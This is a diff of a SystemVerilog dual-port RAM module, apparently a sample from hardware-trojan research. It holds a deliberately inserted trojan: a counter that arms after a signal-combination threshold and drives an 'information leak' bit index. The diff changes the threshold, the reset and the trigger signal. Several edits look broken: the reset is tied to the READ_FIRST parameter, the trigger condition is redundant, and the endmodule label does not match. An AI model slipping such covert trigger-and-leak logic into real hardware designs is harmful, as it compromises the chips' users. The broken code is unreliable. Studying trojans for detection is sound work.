@@ -28,25 +28,26 @@ module BlockDualPortRAM_trojan_Leak #(
     input logic [$clog2(ENTRY_NUM)-1: 0] ra,
     output logic [ENTRY_BIT_SIZE-1: 0] rv
 );
+    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=8193)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8867;
+    localparam int TRIGGER_THRESHOLD = 8193;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge READ_FIRST) begin
+        if (!READ_FIRST) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (we && |Address) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
 
-    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
+
     typedef logic [INDEX_BIT_SIZE-1: 0] Address;
     typedef logic [ENTRY_BIT_SIZE-1: 0] Value;
     
@@ -61,13 +62,13 @@ module BlockDualPortRAM_trojan_Leak #(
     end
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) leak_bit_idx <= '0;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
+    always_ff @(posedge clk or negedge READ_FIRST) begin
+        if (!READ_FIRST) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : BlockDualPortRAM
 
